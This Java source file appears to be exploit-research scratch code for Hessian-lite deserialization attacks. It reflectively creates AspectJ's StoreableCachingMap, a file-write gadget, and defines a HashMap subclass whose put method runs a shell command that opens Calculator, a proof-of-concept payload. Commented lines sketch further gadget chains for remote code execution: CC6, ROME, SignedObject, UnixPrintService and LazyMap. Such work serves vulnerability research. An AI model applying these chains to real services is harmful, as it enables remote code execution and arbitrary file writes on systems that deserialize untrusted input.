package xyz.eki.marshalexp.solution;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import xyz.eki.marshalexp.gadget.jdk.GHashMap;
import xyz.eki.marshalexp.gadget.jdk.GHashset;
import xyz.eki.marshalexp.gadget.jdk.GSignedObject;
import xyz.eki.marshalexp.gadget.jdk.GUnixPrintService;
import xyz.eki.marshalexp.gadget.rome.GRome;
import xyz.eki.marshalexp.poc.AspectJ;
import xyz.eki.marshalexp.poc.CC6;
import xyz.eki.marshalexp.utils.SerializeUtils;

import java.lang.reflect.Constructor;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;

public class HessianLite {

    public static class MyHashMap<K, V> extends HashMap<K, V> {

        String folder;
        int storingTimer;

//        private  MyHashMap(String folder, int storingTimer){
//            this.folder = folder;
//            this.storingTimer = storingTimer;
//        }
        public V put(K key, V value) {
            super.put(key, value);
            System.out.println(111111111);
            try{
                Runtime.getRuntime().exec("open -a Calculator.app");
            }catch (Exception e){}
            System.out.println(22222222);
            return  null;
        }
    }


    public static void main(String[] args) throws Exception{
        //Object signedObj = GSignedObject.getter2Deserialize(new CC6().getPocObject("open -a Calculator.app"));
//        Object sink = GUnixPrintService.getter2RCE("open -a Calculator.app");
//        Object gadget = GRome.toString2GetterSynd(sink);

        String filepath = "./test.txt";
        String content = "test";

        String fileName    = filepath.substring(filepath.lastIndexOf("/")+1);
        String filePath    = filepath.substring(0,filepath.lastIndexOf("/")+1);


        Class<?>   c       = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor<?> constructor = c.getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
        Map map = (Map) constructor.newInstance(filePath, 10000);

        map.put("123","123".getBytes());
//        // 初始化一个 Transformer，使其 transform 方法返回要写出的 byte[] 类型的文件内容
//        Transformer transformer = new ConstantTransformer(content.getBytes(StandardCharsets.UTF_8));
//
//        // 使用 StoreableCachingMap 创建 LazyMap 并引入 TiedMapEntry
//        Map          lazyMap = LazyMap.decorate(map, transformer);
//        TiedMapEntry entry   = new TiedMapEntry(lazyMap, fileName);

        //Object exp = GHashMap.deserialize2HashCode(entry,entry);
        //Object exp = new AspectJ().getPocObject("./test.txt","Test");

        //SerializeUtils.deserialize(SerializeUtils.serialize(exp));

        //SerializeUtils.hessian2Serialize(SerializeUtils.hessianLiteSerialize(map));

        MyHashMap exp = new MyHashMap();
        exp.put("1", "1");
        //Object exp = map;

        byte[] bytes = SerializeUtils.hessianLiteSerialize(exp);

        Object re = SerializeUtils.hessianLiteDeserialize(bytes);

        System.out.println(re.getClass().getName());
    }
}
